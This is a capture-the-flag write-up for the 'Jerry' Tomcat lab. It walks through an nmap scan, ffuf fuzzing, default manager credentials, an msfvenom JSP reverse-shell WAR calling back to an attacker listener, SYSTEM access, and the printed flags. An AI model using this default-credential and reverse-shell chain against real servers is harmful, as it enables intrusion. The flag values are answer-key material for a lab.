## Jerry

### Lab Details 

- Difficulty: Easy
- Type: Apache Tomcat, Web Exploit, Windows

#### Tasks
Q1: Which TCP port is open on the remote host?
- run `nmap -sT -T4 -vv -A -p- -oA Jerry 10.10.10.95`
```
PORT     STATE SERVICE REASON  VERSION
8080/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
```

Q2: Which web server is running on the remote host? Looking for two words.
- from output of nmap, the web server is Apache Tomcat serves Java web apps

Q3: Which relative path on the webserver leads to the Web Application Manager?
- you can run ffuf or visit `http://10.10.10.95:8080/` and click on 'Manager App' top right corner
- below is output of ffuf
```
ffuf -u http://10.10.10.95:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.95:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

<snip>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 341ms]
    * FUZZ: manager
<snip>
```
Q4: What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password
- find is located at /manager/html from 403 response, if you entere password too many times 403 page will be served
- can use curl
```
$: curl http://10.10.10.95:8080/manager/html       
<snip>
  <title>401 Unauthorized</title>
  <style type="text/css">
    <!--
    BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;}
    H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;}
    PRE, TT {border: 1px dotted #525D76}
    A {color : black;}A.name {color : black;}
    -->
  </style>
 </head>
 <body>
   <h1>401 Unauthorized</h1>
   <p>
    You are not authorized to view this page. If you have not changed
    any configuration files, please examine the file
    <tt>conf/tomcat-users.xml</tt> in your installation. That
    file must contain the credentials to let you use this webapp.
   </p>
   <p>
    For example, to add the <tt>manager-gui</tt> role to a user named
    <tt>tomcat</tt> with a password of <tt>s3cret</tt>, add the following to the
    config file listed above.
   </p>
<pre>
&lt;role rolename="manager-gui"/&gt;
&lt;user username="tomcat" password="s3cret" roles="manager-gui"/&gt;
</pre>
<snip>
```

Q5: Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?
- Tomcat can serve jsp file and able to process WAR or java class files, in this case its WAR
- after login in at the bottom of the page allow you to upload a war file
- use msfvenom to generate a web reverse shell and upload it
- once uploaded set up a local nc and click on our shell.war
```
$: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=4444 -f war > shell.war
Payload size: 1101 bytes
```

Q6: Get user and root flag
- the reverse shell gives nt authority \ system which is the highest level of access on a local windows machine
```
$: nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,601,408,000 bytes free

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,601,408,000 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>^C
```



#### Lesson Learned
